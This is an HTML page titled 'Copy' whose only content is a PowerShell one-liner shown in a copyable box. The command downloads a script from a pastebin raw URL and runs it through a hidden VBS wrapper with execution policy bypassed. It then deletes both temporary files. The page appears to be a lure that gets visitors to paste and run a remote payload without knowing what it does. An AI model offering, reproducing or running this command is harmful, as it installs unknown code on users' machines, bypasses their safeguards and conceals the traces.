<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>Copy</title>
<style>
  body {
    margin: 0;
    background: #f3f3f3;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    padding: 24px;
  }

  .box {
    background: white;
    border: 1px solid #cfcfcf;
    border-radius: 6px;
    padding: 14px;
    box-shadow: inset 0 0 0 1px #e5e5e5;
    display: inline-block;
    max-width: 100%;
  }

  pre {
    margin: 0;
    font-family: Consolas, Menlo, Monaco, monospace;
    font-size: 14px;
    line-height: 1.45;
    white-space: pre-wrap;
    word-break: break-word;
    user-select: text;
  }
</style>
</head>
<body>

<div class="box">
  <pre id="text"></pre>
</div>

<script>
  document.getElementById("text").textContent =
`$url = "https://pastebin.com/raw/K9J6wYsP"; $tmpFile = "$env:TEMP\tmp_$(Get-Random).ps1"; Invoke-WebRequest -Uri $url -OutFile $tmpFile; $vbsFile = "$env:TEMP\run_$(Get-Random).vbs"; @"
CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$tmpFile""", 0, False
"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue`;
</script>

</body>
</html>
